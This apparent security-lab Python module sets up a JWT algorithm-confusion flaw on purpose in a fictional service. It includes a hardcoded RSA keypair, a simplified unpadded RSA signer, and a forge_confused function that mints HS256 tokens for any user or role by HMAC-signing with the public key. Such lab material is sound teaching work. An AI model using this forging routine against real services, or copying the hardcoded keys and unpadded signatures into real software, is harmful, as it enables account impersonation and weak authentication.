"""A real (static, fictional) RSA keypair for the lab's JWT story.

auth issues RS256 access tokens signed with the private key; the public
key is exposed at /auth/certs like any real IdP. The planted confusion:
core's verifier accepts HS256 WHERE THE HMAC KEY IS THE PUBLIC PEM —
the classic alg-confusion. The math below is textbook RSA (PKCS#1 v1.5
signature shape simplified for the lab): sign = m^d mod n, verify by
m == s^e mod n over the digest. Deterministic and dependency-free.
"""

from __future__ import annotations

import base64
import hashlib
import json

# 1024-bit fictional keypair (generated once for the lab; it guards a
# fake SaaS, not a real one)
N = int(
    "0xb23e94ea8ee46a2a57e0944537c648507b6ed4aee6028fa41e49f0fce3e7b70fde0f0a98d8f0da649eedc4a948d84c94b3edd57a31100a9fd38b67941661c78000bc6e2d7b4e51e542a29ae030827e8c070ee84c1d508c1ea4e7de61479d433e0b1881cd5ced1ed40356fc25789ef8c35e9c81ede2d0e042acd698f2164f6b2b",
    16,
)
E = 65537
D = int(
    "0x9abb7112ddd0b3c8e65872de53b8b1760c70fdf8867b9aae620cd642f2a5686941dfd4d7331c82b9eead8197634141d9a508c5d5395a2f9ee749913520e8e90162f3eae614671f18d68d775499530ebf7977713ee3c8a59e5654f4bd87c790aa3c249a3aede093bf2181da2009eafd001d73f458842b47d82ab630ad47c94161",
    16,
)

PUBLIC_PEM = f"""-----BEGIN PUBLIC KEY-----
{base64.encodebytes(N.to_bytes((N.bit_length() + 7) // 8, 'big')).decode().strip()}
-----END PUBLIC KEY-----
"""


def _digest_int(message: bytes) -> int:
    """PKCS#1 v1.5-shaped digest info for sha256, as an integer."""
    prefix = bytes.fromhex("3031300d060960864801650304020105000420")
    return int.from_bytes(prefix + hashlib.sha256(message).digest(), "big")


def rs256_sign(message: bytes) -> str:
    """m^d mod n over the digest — the lab's RS256 signature (hex)."""
    return format(pow(_digest_int(message), D, N), "x")


def rs256_verify(message: bytes, sig_hex: str) -> bool:
    try:
        return pow(int(sig_hex, 16), E, N) == _digest_int(message)
    except ValueError:
        return False


def issue_rs256(user: str, tenant: str, role: str) -> str:
    import base64 as _b64
    import time as _t

    def b64(d: bytes) -> str:
        return _b64.urlsafe_b64encode(d).rstrip(b"=").decode()

    header = {"alg": "RS256", "kid": "rsa-2026", "typ": "JWT"}
    payload = {"sub": user, "tenant": tenant, "role": role,
               "iat": int(_t.time()), "exp": int(_t.time()) + 3600}
    signing = b64(json.dumps(header).encode()) + "." + b64(json.dumps(payload).encode())
    return signing + "." + rs256_sign(signing.encode())


def hs256_with_pem(message: bytes) -> str:
    """THE CONFUSION PRIMITIVE: HMAC(public PEM) — what core's verifier
    wrongly accepts as a valid signature for alg=HS256."""
    import hmac as _hmac

    return _hmac.new(PUBLIC_PEM.encode(), message, hashlib.sha256).hexdigest()


def forge_confused(user: str, tenant: str, role: str) -> str:
    """A token any attacker with /auth/certs access can mint."""
    import base64 as _b64
    import time as _t

    def b64(d: bytes) -> str:
        return _b64.urlsafe_b64encode(d).rstrip(b"=").decode()

    header = {"alg": "HS256", "kid": "rsa-2026", "typ": "JWT"}
    payload = {"sub": user, "tenant": tenant, "role": role,
               "iat": int(_t.time()), "exp": int(_t.time()) + 3600}
    signing = b64(json.dumps(header).encode()) + "." + b64(json.dumps(payload).encode())
    return signing + "." + hs256_with_pem(signing.encode())
